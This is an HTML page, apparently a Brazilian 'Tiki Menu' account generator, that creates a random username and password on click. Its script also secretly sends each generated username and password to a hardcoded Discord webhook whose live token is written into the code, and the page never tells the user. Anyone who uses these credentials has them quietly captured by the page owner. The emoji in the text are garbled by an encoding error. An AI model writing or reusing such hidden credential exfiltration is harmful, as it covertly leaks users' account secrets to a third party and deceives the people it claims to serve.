<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Gerador de conta - Tiki Menu</title>
  <style>
    body {
      font-family: 'Poppins', sans-serif;
      background: radial-gradient(circle at top left, #667eea, #764ba2);
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
      margin: 0;
      color: #fff;
      overflow: hidden;
    }

    h1 {
      font-size: 3rem;
      margin-bottom: 30px;
      text-shadow: 2px 2px 10px rgba(0,0,0,0.4);
      animation: fadeIn 1.5s ease-in-out;
    }

    button {
      padding: 15px 40px;
      font-size: 20px;
      font-weight: bold;
      background: linear-gradient(to right, #43e97b, #38f9d7);
      color: white;
      border: none;
      border-radius: 50px;
      cursor: pointer;
      box-shadow: 0 8px 15px rgba(0,0,0,0.3);
      transition: all 0.4s ease;
    }

    button:hover {
      background: linear-gradient(to right, #38f9d7, #43e97b);
      transform: translateY(-5px) scale(1.05);
    }

    .output {
      margin-top: 40px;
      background: rgba(255, 255, 255, 0.15);
      padding: 30px 40px;
      border-radius: 20px;
      box-shadow: 0 8px 20px rgba(0,0,0,0.25);
      font-size: 22px;
      font-weight: 600;
      text-align: center;
      color: #ffffff;
      backdrop-filter: blur(15px);
      border: 1px solid rgba(255, 255, 255, 0.2);
      animation: fadeInUp 1s ease-in-out;
    }

    .output p {
      margin: 12px 0;
    }

    span {
      color: #ffee58;
    }

    @keyframes fadeIn {
      from {opacity: 0; transform: translateY(-20px);}
      to {opacity: 1; transform: translateY(0);}
    }

    @keyframes fadeInUp {
      from {opacity: 0; transform: translateY(40px);}
      to {opacity: 1; transform: translateY(0);}
    }
  </style>
  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet">
</head>
<body>
  <h1>ü¶Ü Tiki Menu - Gerador de Conta</h1>
  <button onclick="gerarDados()">üîÅ GERAR</button>
  <div class="output" id="resultado"></div>

  <script>
    async function gerarDados() {
      const resultado = document.getElementById("resultado");
      resultado.innerHTML = "";

      const caracteresNome = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
      const tamanhoNome = Math.floor(Math.random() * (12 - 5 + 1)) + 5;
      let nomeAleatorio = "";
      for (let i = 0; i < tamanhoNome; i++) {
        nomeAleatorio += caracteresNome.charAt(Math.floor(Math.random() * caracteresNome.length));
      }

      const letrasENumeros = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
      const tamanhoSenha = Math.floor(Math.random() * (14 - 8 + 1)) + 8;
      let senhaArray = [];
      for (let i = 0; i < tamanhoSenha - 1; i++) {
        senhaArray.push(letrasENumeros.charAt(Math.floor(Math.random() * letrasENumeros.length)));
      }

      const posUnderscore = Math.floor(Math.random() * (senhaArray.length - 1)) + 1;
      senhaArray.splice(posUnderscore, 0, "_");
      const senha = senhaArray.join("");

      resultado.innerHTML = `<p>üë§ Nome: <span>${nomeAleatorio}</span></p><p>üîë Senha: <span>${senha}</span></p>`;

      const webhookUrl = "https://discord.com/api/webhooks/1359236714345795666/KQDmsAnfVrAfQI8_r9D66ra2ah9NGUn8pXVqlRsqzEQ_GiTi4njF0PXporKk9joqgFVt";

      const embed = {
        embeds: [
          {
            title: "üîê Nova Conta Gerada!",
            color: 5814783,
            fields: [
              {
                name: "üìõ Nome",
                value: `\`${nomeAleatorio}\``,
                inline: true
              },
              {
                name: "üîë Senha",
                value: `\`${senha}\``,
                inline: true
              }
            ],
            footer: {
              text: "Tiki Menu ‚Ä¢ Gerador Autom√°tico",
              icon_url: "https://media.discordapp.net/attachments/1359236686764048684/1359240651392286973/Logo.png?ex=67f6c300&is=67f57180&hm=5627a2bca8ae63de99f38a26f3c9107a24352f528c174df67e9d29cb59ec5d55&=&format=webp&quality=lossless&width=434&height=434"
            },
            timestamp: new Date().toISOString()
          }
        ]
      };

      try {
        await fetch(webhookUrl, {
          method: "POST",
          headers: {
            "Content-Type": "application/json"
          },
          body: JSON.stringify(embed)
        });
      } catch (error) {
        console.error("Erro ao enviar para o Discord:", error);
      }
    }
  </script>
</body>
</html>
